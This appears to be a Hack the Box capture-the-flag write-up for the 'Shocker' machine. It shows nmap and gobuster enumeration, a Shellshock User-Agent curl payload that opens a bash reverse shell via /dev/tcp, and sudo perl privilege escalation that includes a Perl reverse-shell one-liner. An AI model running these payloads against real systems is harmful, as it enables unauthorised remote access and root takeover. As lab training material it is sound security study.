# Hack the Box: Shocker

After reading the name I had a fair bit of Idea of what this is. Basically ```shellshock``` vulnerability.

Starting with the usual NMAP scans

```zsh
nmap -sS -p- -Pn -r- 10.10.10.56```

You will see that only 2 ports are open 80 and 2222 are open.

```zsh
nmap -sC -sV -p 80,2222 -Pn 10.10.10.56
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 09:14 EDT
Nmap scan report for 10.10.10.56
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

Note dirsearch and nothing will yield any result here unless we use -x .sh .pl  with it.

```gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirb/small.txt -x .sh .zsh .pl -t 30```


Now, the nmap script for this is not working.

Here is how to fix it:

```zsh
locate nse | grep shellshock
```
Open it and then edit these parts

```
  if cmd ~= nil then
  cmd = '() { :;}; echo;'..cmd
```

And comment out this line:

```options["header"][cmd] = cmd``` by using ```--``` before it.

Now the script should start to work for you.

How did come across it ? Start a listener on BURP and redirect all data to localhost:LocalPort.

Now you can go the BURP way or you can go the php way using curl command. We will be targeting the the User Agent part. 

Start a listener on port 1234

```zsh
nc -lvnp 1234
```

```zsh
curl -H 'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 10.10.14.5:1234'' http://10.10.10.56/cgi-bin/user.sh
```

Now you will see this on your listener

```zsh
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.14.5] 34090
GET / HTTP/1.1
Host: 10.10.14.5:1234
Accept: */*
User-Agent: () { :; }; /bin/bash -c ping

```

Now replace the ping command with this
```/bin/bash -i >& /dev/tcp/192.168.0.101/1234 0>&1```

```zsh
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/1234 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

And now you will have a shell on your listener. Now for privesc.

```shell
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can see that we can execute perl as sudo without password. Now in order to solve that. We can do in 2 methods

- Method 1
```sudo /usr/bin/perl -e 'exec "/bin/bash";'```

- Method 2
```sudo perl -e 'use Socket;$i="10.10.14.5";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

Both will give you a root shell. Grab the flags.